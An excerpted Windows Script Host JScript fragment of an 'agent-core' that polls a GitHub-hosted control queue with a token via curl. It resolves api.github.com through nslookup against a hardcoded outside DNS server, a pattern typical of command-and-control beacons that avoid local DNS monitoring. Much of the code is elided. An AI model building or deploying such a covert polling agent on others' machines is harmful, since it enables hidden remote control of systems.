// WR-MODULE: agent-core-js 2026.08.14-1148-ET
...
(function () {
    ...
    var nslookup = a.length > 7 ? a(7) : "C:\\Windows\\System32\\nslookup.exe";
    var dns = a.length > 8 ? a(8) : "64.71.255.204";
    ...
    function resolveHost(host) {
        try {
            if (host === "api.github.com") {
                var cache = work + "\\github-api-ip.txt";
                if (fso.FileExists(cache)) {
                    var cached = readText(cache).replace(/\s+/g, "");
                    if (validIpv4(cached)) return cached;
                }
            }
            if (!fso.FileExists(nslookup)) return "";
    ...
    function curlGet(url, token, out, status) {
        ...
        try {
            ...
            writeText(status, String(stdout).replace(/\s+/g, "") || "000");
            if (stderr) writeText(work + "\\AGENT_CURL_ERROR.txt", stderr);
            return e.ExitCode;
        } catch (ex) {
            writeText(status, "000");
            writeText(work + "\\AGENT_CURL_ERROR.txt", "WScript.Shell.Exec failed: " + ex.message);
            return 91;
        }
    }
    ...
    function poll() {
        ...
        var crc = curlGet(url, token, body, stat);
        var http = readText(stat).replace(/\s+/g, "") || "000";
        if (crc !== 0 || http !== "200") { writeState("WARNING", "Control queue unavailable. curl " + crc + ", GitHub HTTP " + http + "."); return 40; }
